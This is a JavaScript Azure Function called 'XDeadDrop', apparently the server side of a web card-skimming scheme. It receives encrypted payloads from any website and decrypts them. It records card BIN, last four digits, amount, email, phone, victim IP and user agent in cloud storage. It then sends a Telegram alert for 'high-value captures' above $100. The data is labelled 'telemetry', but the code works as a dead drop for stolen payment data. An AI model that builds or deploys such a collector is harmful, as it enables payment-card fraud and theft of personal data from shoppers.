const crypto = require('crypto');

module.exports = async function (context, req) {
    context.log('XDeadDrop: Processing request');
    
    // CORS headers
    const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Session-ID, X-CSRF-Token'
    };

    // Handle CORS preflight
    if (req.method === 'OPTIONS') {
        context.res = {
            status: 204,
            headers: corsHeaders
        };
        return;
    }

    try {
        // Validate request method
        if (req.method !== 'POST') {
            context.res = {
                status: 405,
                headers: corsHeaders,
                body: { error: 'Method not allowed' }
            };
            return;
        }

        // Extract and validate payload
        const { encryptedData, sessionId, referrer } = req.body;
        
        if (!encryptedData || !sessionId) {
            context.res = {
                status: 400,
                headers: corsHeaders,
                body: { error: 'Missing required fields' }
            };
            return;
        }

        // Decrypt payload
        const decrypted = await decryptPayload(encryptedData, process.env.PRIVATE_KEY_PEM);
        
        // Process decrypted data
        const processedData = await processTelemetryData(decrypted, {
            sessionId,
            referrer: referrer || 'unknown',
            ip: req.headers['x-forwarded-for'] || req.ip || 'unknown',
            userAgent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString()
        });

        // Store in Azure Table Storage
        await storeInTableStorage(processedData);

        // Send alert for high-value captures
        if (processedData.amount > 100) {
            await sendTelegramAlert(processedData);
        }

        // Success response
        context.res = {
            status: 200,
            headers: {
                ...corsHeaders,
                'Content-Type': 'application/json'
            },
            body: {
                success: true,
                message: 'Data processed successfully',
                id: sessionId
            }
        };

    } catch (error) {
        context.log.error('XDeadDrop error:', error);
        context.res = {
            status: 500,
            headers: corsHeaders,
            body: { error: 'Internal server error' }
        };
    }
};

// Decrypt RSA-OAEP payload
async function decryptPayload(encryptedBase64, privateKeyPem) {
    try {
        const encryptedBuffer = Buffer.from(encryptedBase64, 'base64');
        
        const decrypted = crypto.privateDecrypt(
            {
                key: privateKeyPem,
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: 'sha256'
            },
            encryptedBuffer
        );

        return JSON.parse(decrypted.toString('utf8'));
    } catch (error) {
        throw new Error(`Decryption failed: ${error.message}`);
    }
}

// Process telemetry data
async function processTelemetryData(decryptedData, metadata) {
    return {
        // Original encrypted payload
        rawData: decryptedData,
        
        // Enriched metadata
        sessionId: metadata.sessionId,
        referrer: metadata.referrer,
        ip: metadata.ip,
        userAgent: metadata.userAgent,
        timestamp: metadata.timestamp,
        
        // Card details (masked)
        cardData: decryptedData.cardData ? {
            bin: decryptedData.cardData.bin,
            last4: decryptedData.cardData.last4,
            type: decryptedData.cardData.type,
            amount: decryptedData.amount || 0
        } : null,
        
        // User info
        email: decryptedData.email || null,
        phone: decryptedData.phone || null,
        
        // Technical info
        source: decryptedData.source || 'unknown',
        url: decryptedData.url || 'unknown'
    };
}

// Store in Azure Table Storage
async function storeInTableStorage(data) {
    try {
        const { TableClient } = require('@azure/data-tables');
        const connectionString = process.env.AZURE_STORAGE_CONNECTION_STRING;
        
        if (!connectionString) {
            context.log.warn('Azure Storage connection string not found');
            return;
        }

        const client = TableClient.fromConnectionString(
            connectionString,
            'xdeaddropLogs'
        );

        const entity = {
            partitionKey: data.sessionId.substring(0, 4) || 'anon',
            rowKey: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
            timestamp: data.timestamp,
            bin: data.cardData?.bin || 'unknown',
            last4: data.cardData?.last4 || 'unknown',
            amount: data.cardData?.amount || 0,
            email: data.email || 'unknown',
            source: data.source || 'unknown',
            referrer: data.referrer || 'unknown',
            ip: data.ip || 'unknown',
            userAgent: data.userAgent || 'unknown'
        };

        await client.createEntity(entity);
        context.log('Data stored in Table Storage:', entity.rowKey);
    } catch (error) {
        context.log.error('Table Storage error:', error);
    }
}

// Send Telegram alert
async function sendTelegramAlert(data) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            context.log.warn('Telegram credentials not configured');
            return;
        }

        const message = `
🔔 **XDeadDrop Alert**
💰 Amount: $${data.cardData?.amount || 0}
💳 Card: ${data.cardData?.bin || 'Unknown'}••••${data.cardData?.last4 || '????'}
📧 Email: ${data.email || 'Unknown'}
🌐 Source: ${data.source}
🕒 Time: ${new Date(data.timestamp).toLocaleString()}
🔗 Referrer: ${data.referrer}
🌍 IP: ${data.ip}
        `.trim();

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }
    } catch (error) {
        context.log.error('Telegram alert failed:', error);
    }
}
